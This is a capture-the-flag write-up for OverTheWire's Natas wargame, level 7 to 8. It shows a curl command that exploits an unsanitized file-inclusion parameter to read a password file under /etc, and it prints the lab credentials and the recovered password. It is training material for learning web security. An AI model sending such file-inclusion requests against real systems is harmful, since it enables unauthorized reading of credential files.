# Natas Level 07 to 08

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 7 -> 8 |
| Status | Complete |

## Objective

Exploit a file inclusion parameter to read the next password.

## Given Access

User: `natas7`

Password:

```text
bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
```

## Method

The page parameter is used to include files. The page source hints that the next password is in `/etc/natas_webpass/natas8`.

## Commands

```bash
curl -s -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS \
  'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
```

## Result

Password for `natas8`:

```text
xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
```

## Lesson

Unsanitized file include parameters can disclose arbitrary local files readable by the web process.

## References

- https://overthewire.org/wargames/natas/
